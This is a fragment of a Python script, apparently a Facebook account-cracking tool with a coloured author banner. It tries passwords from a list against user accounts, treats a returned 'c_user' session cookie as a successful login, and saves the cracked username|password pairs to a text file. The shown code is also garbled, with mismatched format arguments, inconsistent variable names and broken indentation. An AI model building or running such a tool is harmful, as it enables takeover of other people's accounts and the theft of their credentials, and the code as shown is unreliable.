...
logo =                                          """   
   ...
   \033[1;37m $$ |\$$$ |  $$ |  $$ |     $$ |  $$ |   $$ |    
   \033[1;37m  $$ | \$$ |$$$$$$\ $$$$$$$$\ $$$$$$  |   $$ |    
   \033[1;37m \__|  \__|\______|\________|\______/    \__|
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           APON NILOY
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          NIL.AHMED.NILOY.OFFICIAL
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           NIL-NILOY
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mNILOY_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mALON_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back NILOY Menu ")
	    sarfraz()
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s [NILOY-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('NILOY_CP.txt' , 'a').write('%s\n' % wrt)
                        break
